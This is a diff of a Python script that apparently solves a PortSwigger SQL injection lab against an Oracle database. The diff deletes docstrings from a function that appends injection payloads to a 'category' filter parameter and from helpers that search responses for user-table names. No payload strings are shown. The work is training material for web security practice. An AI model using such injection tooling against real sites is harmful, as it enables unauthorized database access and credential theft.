@@ -7,10 +7,6 @@ session = requests.Session()
 
 
 def send_payload(sql_injection):
-    """
-    Appends a SQL injection payload to the 'category' filter parameter
-    and returns the parsed HTML response.
-    """
     response = session.get(
         BASE_URL + "/filter",
         params={"category": "Accessories" + sql_injection},
@@ -20,13 +16,6 @@ def send_payload(sql_injection):
 
 
 def find_text_containing(soup, keyword):
-    """
-    Finds the first piece of text in the page that CONTAINS keyword
-    (case-insensitive). PortSwigger labs often add a random suffix to
-    table/column names (e.g. 'USERS_JYPOMG'), so we can't match them
-    exactly - a substring match is needed instead.
-    Returns the stripped text, or None if not found.
-    """
     match = soup.find(
         string=lambda text: text and keyword.lower() in text.strip().lower()
     )
@@ -34,12 +23,6 @@ def find_text_containing(soup, keyword):
 
 
 def find_all_text_containing(soup, keyword):
-    """
-    Same idea as find_text_containing, but returns EVERY match instead of
-    just the first one. Oracle's all_tables can list more than one table
-    with 'users' in its name (e.g. a decoy table), so we need to check
-    all of them, not just whichever one shows up first.
-    """
     matches = soup.find_all(
         string=lambda text: text and keyword.lower() in text.strip().lower()
     )
